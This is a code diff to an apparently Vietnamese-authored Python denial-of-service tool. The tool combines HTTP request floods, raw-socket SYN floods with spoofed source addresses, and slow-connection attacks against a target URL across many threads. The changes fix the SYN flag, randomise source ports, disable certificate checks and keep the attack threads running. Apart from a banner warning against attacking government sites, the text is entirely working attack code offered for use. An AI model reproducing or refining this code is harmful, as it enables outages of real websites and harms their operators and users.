@@ -6,14 +6,25 @@ from urllib.parse import urlparse
 from colorama import Fore, Style
 from socket import *
 from random import randrange, choice
-import re
+import ssl
+from struct import pack
+import warnings
+
+# Tắt cảnh báo SSL
+warnings.filterwarnings("ignore", category=UserWarning, module='requests')
 
 print("""
 .-.   .-..-..----.  .---.  .----. .----.     .----..-----..-. .-..----. .-. .---.  
  \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
   \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
    `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
-""")
+AuThor: __VIBOSS__
+Github: https://github.com/dhungx/ddos
+
+ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC)
+
+HÃY CẨN THẬN TRƯỚC KHI SỬ DỤNG VÌ CÓ THỂ VIỆC BẠN SẮP LÀM LÀ MỘT ĐIỀU PHẠM PHÁP
+""" + Style.RESET_ALL)
 
 class DDoSAttack:
     def __init__(self, target_url, threads):
@@ -29,14 +40,17 @@ class DDoSAttack:
         print(f"Starting attack on {self.target_url}")
         for _ in range(self.threads):
             thread = threading.Thread(target=self.run)
+            thread.daemon = True
             thread.start()
+        while True:
+            time.sleep(1)
 
     def run(self):
         while True:
             self.ddos_requester()
             self.syn_flood()
             self.pyslow()
-            time.sleep(0)  # Wait a bit before restarting
+            time.sleep(0.1)  # Wait a bit before restarting
 
     def ddos_requester(self):
         headers = {
@@ -49,7 +63,7 @@ class DDoSAttack:
         
         try:
             url = f"{self.schema}://{self.target_domain}{self.target_path}"
-            response = requests.get(url, headers=headers, timeout=10)
+            response = requests.get(url, headers=headers, timeout=5, verify=False)
             self.attack_num += 1
             print(Fore.GREEN + f"Requester packet sent! Attack count: {self.attack_num} - Response code: {response.status_code}" + Style.RESET_ALL)
         except requests.RequestException as e:
@@ -73,8 +87,6 @@ class DDoSAttack:
             sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             sock.sendto(packet, (self.target_domain, 0))
             print(Fore.GREEN + "SYN Flood packet sent!" + Style.RESET_ALL)
-        except KeyboardInterrupt:
-            print("SYN Flood stopped.")
         except Exception as e:
             print(Fore.RED + f"Error in SYN Flood: {e}" + Style.RESET_ALL)
 
@@ -83,10 +95,9 @@ class DDoSAttack:
             sock = socket(AF_INET, SOCK_STREAM)
             sock.connect((self.target_domain, 80))
             sock.send(b'GET / HTTP/1.1\r\n')
-            time.sleep(5)
+            time.sleep(1)
+            sock.close()
             print(Fore.GREEN + "Pyslow connection established!" + Style.RESET_ALL)
-        except KeyboardInterrupt:
-            print("Pyslow stopped.")
         except Exception as e:
             print(Fore.RED + f"Error in Pyslow: {e}" + Style.RESET_ALL)
 
@@ -102,19 +113,19 @@ class DDoSAttack:
         frag_off = 0
         ttl = 64
         protocol = IPPROTO_TCP
-        check = 10
+        check = 0
         s_addr = inet_aton(self.fake_ip())
         d_addr = inet_aton(self.target_domain)
         ihl_version = (version << 4) + ihl
         return pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
 
     def create_tcp_header(self):
-        source = 54321
+        source = randrange(1024, 65535)
         dest = 80
         seq = 0
         ack_seq = 0
         doff = 5
-        tcp_flags = 1
+        tcp_flags = 2  # SYN flag
         window = socket.htons(5840)
         check = 0
         urg_prt = 0
@@ -134,8 +145,6 @@ Github: https://github.com/dhungx/ddos
 ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC)
 
 HÃY CẨN THẬN TRƯỚC KHI SỬ DỤNG VÌ CÓ THỂ VIỆC BẠN SẮP LÀM LÀ MỘT ĐIỀU PHẠM PHÁP
-
-
 """ + Style.RESET_ALL)
     print(Style.BRIGHT + Fore.YELLOW + "[INFORMATION!]" + Fore.WHITE + " Press CTRL + C and ENTER to exit!!")
     print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
